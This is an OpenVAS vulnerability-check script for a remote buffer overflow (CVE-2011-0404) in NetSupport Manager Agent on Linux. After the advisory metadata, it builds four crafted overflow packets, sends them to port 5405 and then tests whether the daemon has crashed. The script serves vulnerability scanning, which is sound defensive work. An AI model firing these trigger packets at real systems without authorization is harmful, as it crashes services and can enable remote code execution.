###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netsupport_manager_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# NetSupport Manager Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to crash an affected daemon or
  execute arbitrary code.
  Impact Level: Application";
tag_affected = "NetSupport Manager Agent 11.00 on Linux.";
tag_insight = "The flaw is caused by a buffer overflow error when processing packets sent
  to port 5405/TCP, which could be exploited by remote unauthenticated attackers
  to crash an affected daemon or execute arbitrary code.";
tag_solution = "No solution or patch is available as of 19th January 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.netsupportmanager.com/";
tag_summary = "The host is running NetSupport Manager and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(801810);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
  script_cve_id("CVE-2011-0404");
  script_bugtraq_id(45728);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("NetSupport Manager Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42794");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15937");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1024943");
  script_xref(name : "URL" , value : "http://www.ikkisoft.com/stuff/netsupport_linux.txt");

  script_description(desc);
  script_summary("Determine if NetSupport Manager is prone to Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(5405);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Default NetSupport Manager Port
port = 5405;
if(!get_port_state(port)){
  exit(0);
}

## Build Exploit
triggerA = raw_string(0x15,0x00,0x5a,0x00) +
           crap(data: raw_string(0x41), length: 1024) +
           raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00);

triggerB = raw_string(0x25,0x00,0x51,0x00,0x81,0x41,0x41,0x41,0x41,0x41,0x41,
                      0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00,0x00,0x00,0x00);

triggerC = raw_string(0x37,0x00,0x03,0x00,0x0a,0x00,0x00,0x00,0x00,0x00,0x58,
                      0xb4,0x92,0xff,0x00,0x00,0x69,0x6b,0x6b,0x69,0x00,0x57,
                      0x4f,0x52,0x4b,0x47,0x52,0x4f,0x55,0x50,0x00,0x3c,0x3e) +
           crap(data: "A", length: 976) +
           raw_string(0x00,0x00,0x31,0x32,0x2e,0x36,0x32,0x2e,0x31,0x2e,0x34,
                      0x32,0x30,0x00,0x31,0x30,0x00,0x00);

triggerD = raw_string(0x06,0x00,0x07,0x00,0x20,0x00,0x00,0x00,0x0e,0x00,0x32,
                      0x00,0x01,0x10,0x18,0x00,0x00,0x01,0x9f,0x0d,0x00,0x00,
                      0xe0,0x07,0x06,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x02,
                      0x00,0x4e,0x00,0x02,0x00,0xac,0x00,0x04,0x00,0x7f,0x00,
                      0x00,0x00);

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Get Banner
banner = recv(socket:soc, length:100);

## Confirm The Application
if("localhost.local" >!< banner) {
  exit(0);
}

## Sending Attack
send(socket: soc, data: triggerA);
sleep(1);

send(socket: soc, data: triggerB);
sleep(1);

send(socket: soc, data: triggerC);
sleep(1);

send(socket: soc, data: triggerD);
close(soc);
sleep(5);

## Chek Port Status
soc = open_sock_tcp(port);
if(!soc){
  security_hole(port:port);
}

close(soc);
